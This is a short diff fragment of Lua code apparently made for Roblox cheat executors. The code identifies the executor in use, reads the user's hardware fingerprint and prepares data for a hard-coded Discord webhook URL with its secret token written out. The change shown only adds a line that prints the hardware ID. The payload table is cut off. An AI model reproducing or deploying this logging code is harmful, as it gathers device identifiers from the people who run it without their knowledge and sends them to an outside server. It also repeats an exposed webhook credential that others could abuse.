@@ -12,13 +12,13 @@ elseif not IsElectron and not IsValyse then
         decoded.headers["Sw-Fingerprint"]
     )
 end
+print(hwid)
 local webhookcheck =
 is_sirhurt_closure and "Sirhurt" or pebc_execute and "ProtoSmasher" or syn and "Synapse X" or
 secure_load and "Sentinel" or
 KRNL_LOADED and "Krnl" or
 SONA_LOADED and "Sona" or
 "shit exploit"
-
 local url =
    "https://discord.com/api/webhooks/1141530367422111936/Owtl-xM9Z_qUy5FAzUlmsCfFWC3gISuJTkyDD8aM-hZ3jGCL20R2VOEfenpQd40sDhEz"
 local data = {
